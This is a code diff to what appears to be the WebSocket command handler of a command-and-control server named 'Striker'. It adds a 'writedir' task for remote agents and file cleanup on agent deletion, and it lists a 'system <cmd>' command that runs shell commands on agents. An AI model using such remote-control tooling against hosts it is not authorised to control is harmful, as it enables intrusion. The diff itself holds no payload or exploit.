@@ -7,6 +7,7 @@ import {Server} from 'socket.io';
 import User, * as userModel from '../models/user.js';
 import Agent, * as agentModel from '../models/agent.js';
 import Task, * as taskModel from '../models/task.js';
+import File, * as fileModel from '../models/file.js';
 import {output} from './utils.js';
 
 /**
@@ -61,6 +62,7 @@ export const setupWS = (httpServer) => {
                      "  freeze                 Freeze/stop agent from receiving tasks\n"+
                      "  unfreeze               Unfreeze agent\n"+
                      "  system <cmd>           Run a shell command on the agent\n"+
+                     "  writedir <dir>         Change the write directory of an agent\n"+
                      "  help/?                 Print this help page\n";
 
     /**
@@ -109,8 +111,9 @@ export const setupWS = (httpServer) => {
             client.emit("striker_error", error.message);
           });
         }else if (input === "delete agent"){ // Delete the agent.
-          agentModel.deleteAgent(agentID, username).then(() => {
-            return taskModel.deleteAllTasks(agentID);
+          agentModel.deleteAgent(agentID, username).then(async () => {
+            await taskModel.deleteAllTasks(agentID);
+            await fileModel.deleteAllFiles(agentID);
           }).catch(error => {
             socketServer.emit("striker_error", error.message);
           });
@@ -118,6 +121,13 @@ export const setupWS = (httpServer) => {
           let filename = input.substr(9).trim();
           taskModel.createTask(username, {
             agentID, taskType: "download", data: {file: filename}
+          }).catch(error => {
+            socketServer.emit("striker_error", error.message);
+          });
+        }else if (input.startsWith("writedir ")){ // Change the write dir of an agent.
+          let dir = input.substr(9).trim();
+          taskModel.createTask(username, {
+            agentID, taskType: "writedir", data: {dir}
           }).catch(error => {
             socketServer.emit("striker_error", error.message);
           });
